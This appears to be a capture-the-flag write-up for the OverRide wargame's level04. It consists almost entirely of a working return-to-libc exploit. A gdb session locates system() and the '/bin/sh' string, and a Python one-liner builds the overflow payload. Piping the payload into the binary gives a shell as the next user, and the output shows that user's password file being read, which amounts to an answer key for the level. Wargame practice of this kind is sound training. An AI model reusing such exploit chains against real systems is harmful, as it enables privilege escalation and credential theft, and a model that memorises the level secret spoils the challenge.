offset : 156


(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system, +99999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.


python -c 'print "B"*156+"\xd0\xae\xe6\xf7"+"\xd0\xae\xe6\xf7"+"\xec\x97\xf8\xf7"' > /tmp/payload

```
level04@OverRide:~$ cat /tmp/payload - | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass	
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```